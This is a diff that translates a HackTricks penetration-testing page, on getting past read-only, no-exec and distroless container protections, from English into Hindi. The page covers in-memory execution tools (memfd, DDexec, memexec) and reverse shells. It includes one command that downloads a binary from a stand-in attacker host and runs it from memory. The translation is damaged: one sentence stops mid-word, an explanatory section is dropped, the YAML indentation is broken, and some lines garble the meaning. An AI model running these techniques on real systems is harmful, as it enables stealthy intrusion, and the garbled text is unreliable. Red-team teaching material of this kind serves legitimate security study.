@@ -1,85 +1,65 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# FS सुरक्षा को छेड़ना: केवल पढ़ने योग्य / कोई निष्पादन / Distroless
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family)
+* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण** करें।**
+* **अपनी हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**
 
 </details>
 
-## Videos
+## वीडियो
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+निम्नलिखित वीडियो में आप इस पृष्ठ में उल्लिखित तकनीकों को और गहराई से समझ सकते हैं:
 
 * [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
 * [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## केवल पढ़ने योग्य / कोई निष्पादन स्थिति
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+अधिकांश लिनक्स मशीनों को **केवल पढ़ने योग्य (ro) फ़ाइल सिस्टम सुरक्षा** के साथ माउंट किया जाना अधिक सामान्य हो रहा है, विशेष रूप से कंटेनर में। इसका कारण एक ro फ़ाइल सिस्टम के साथ एक कंटेनर चलाना **`readOnlyRootFilesystem: true`** को `securitycontext` में सेट करना इतना आसान है:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+हालांकि, यदि फ़ाइल सिस्टम को ro के रूप में माउंट किया गया है, तो **`/dev/shm`** अभी भी लिखने योग्य होगा, इसलिए यह झूठा है कि हम डिस्क में कुछ भी नहीं लिख सकते हैं। हालांकि, इस फ़ोल्डर को **निष्पादन सुरक्षा के साथ माउंट किया जाएगा**, इसलिए यदि आप यहां एक बाइनरी डाउनलोड करते हैं तो आप उसे **निष्पादित नहीं कर पाएंगे**।
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+रेड टीम के दृष्टिकोण से, यह **कठिन हो जाता है डाउनलोड और निष्पादित करना** बाइनरीज़ जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर्स या `kubectl` जैसे गणनकों)।
 {% endhint %}
 
-## Easiest bypass: Scripts
+## सबसे आसान छेड़छाड़: स्क्रिप्ट
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+ध्यान दें कि मैंने बाइनरीज़ का उल्लेख किया है, आप किसी भी स्क्रिप्ट को **निष्पादित कर सकते हैं** जब तक इंटरप्रेटर मशीन के अंदर हो, जैसे एक **शेल स्क्रिप्ट** अगर `sh` मौजूद है या एक **पायथन** **स्क्रिप्ट** अगर `python` स्थापित है।
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+हालांकि, यह केवल आपके बाइनरी बैकडोर या अन्य बाइनरी उपकरणों को निष्पादित करने के लिए पर्याप्त नहीं है।
 
-## Memory Bypasses
+## मेमोरी छेड़छाड़
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+यदि आप एक बाइनरी निष्पादित करना चाहते हैं लेकिन फ़ाइल सिस्टम उसे अनुमति नहीं दे रहा है, तो उसे करने का सबसे अच्छा तरीका है **मेमोरी से निष्पादित करना**, क्योंकि **सुरक्षा उसमें लागू नहीं होती है**।
 
-### FD + exec syscall bypass
+### FD + exec सिस्कॉल छेड़छाड़
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
-
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
-
-{% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
-
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
-{% endhint %}
-
-### DDexec / EverythingExec
-
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
-
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
-
-{% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
-{% endhint %}
-
+यदि आपके पास मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन ह
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+इस तकनीक के बारे में अधिक जानकारी के लिए Github या निम्नलिखित लिंक पर जाएं:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -87,52 +67,48 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) DDexec का प्राकृतिक अगला कदम है। यह एक **DDexec शैलकोड डीमनाइज़्ड** है, इसलिए जब भी आप **एक अलग बाइनरी चलाना चाहें** तो आपको DDexec को फिर से चालू करने की आवश्यकता नहीं होती है, आप सिर्फ मेमेक्सेक शैलकोड को DDexec तकनीक के माध्यम से चला सकते हैं और फिर **इस डीमन के साथ संवाद करके नई बाइनरी लोड और चलाने के लिए**।
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) में **memexec का उपयोग करके PHP रिवर्स शैल से बाइनरी चलाने** का उदाहरण देख सकते हैं।
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक बाद में उन्हें चलाने के लिए मेमोरी में बाइनरी लोड करने के लिए एक **आसान तरीका** प्रदान करती है। यह बाइनरी को डिपेंडेंसी के साथ लोड करने की भी अनुमति दे सकता है।
 
 ## Distroless Bypass
 
-### What is distroless
+### डिस्ट्रोलेस क्या है
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+डिस्ट्रोलेस कंटेनर में केवल वही **न्यूनतम घटक होते हैं जो किसी विशेष एप्लिकेशन या सेवा को चलाने के लिए आवश्यक होते हैं**, जैसे पुस्तकालय और रनटाइम डिपेंडेंसी, लेकिन एक पैकेज प्रबंधक, शैल या सिस्टम उपयोगिताएं जैसे बड़े घटकों को छोड़ देते हैं।
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+डिस्ट्रोलेस कंटेनरों का उद्देश्य है कि वे **अनावश्यक घटकों को हटाकर कंटेनरों के आक्रमण सतह को कम करें** और उनमें से उत्पन्न होने वाली संभावितताओं की संख्या को कम करें।
 
-### Reverse Shell
+### रिवर्स शैल
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+डिस्ट्रोलेस कंटेनर में आपको शायद **`sh` या `bash`** तक नहीं मिलेगा आपको एक साधारित शैल प्राप्त करने के लिए। आपको ऐसे बाइनरी भी नहीं मिलेंगे जैसे `ls`, `whoami`, `id`... वह सब कुछ जो आप सामान्यतः एक सिस्टम में चलाते हैं।
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+इसलिए, आप **रिवर्स शैल** प्राप्त नहीं कर पाएंगे या आप सामान्यतः करते हैं वैसे ही सिस्टम की **जांच** नहीं कर पाएंगे।
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+हालांकि, यदि प्रभावित कंटेनर उदाहरण के तौर पर एक फ्लास्क वेब चला रहा है, तो पायथन स्थापित है, और इसलिए आप एक **पायथन रिवर्स शैल** प्राप्त कर सकते हैं। यदि यह नोड चला रहा है, तो आप एक नोड रिवर्स शैल प्राप्त कर सकते हैं, और ऐसा ही अधिकांश **स्क्रिप्टिंग भाषाओं** के साथ।
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+स्क्रिप्टिंग भाषा का उपयोग करके आप भाषा की क्षमताओं का उपयोग करके **सिस्टम की जांच** कर सकते हैं।
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+यदि **`read-only/no-exec`** सुरक्षा उपाय नहीं है, तो आप अपने रिवर्स शैल का दुरुपयोग करके अपने बाइनरी को **फ़ाइल सिस्टम में लिख सकते हैं** और **उन्हें चला सकते हैं**।
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+हालांकि, इस तरह के कंटेनर में आमतौर पर ये सुरक्षा उपाय मौजूद होते हैं, लेकिन आप इन्हें उम्मीदवारी करने के लिए **पिछले मेमोरी निष्पादन तकनीकों का उपयोग कर सकते हैं**।
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में कुछ RCE सुरक्षा उपायों का उपयोग करके स्क्रिप्टिंग भाषाओं के **रिवर्स शैल प्राप्त करने** और मेमोरी से बाइनरी चलाने के उदाहरण देख सकते हैं।
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करना चाहते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
+* [**आधिकारिक PEASS और HackTricks swag
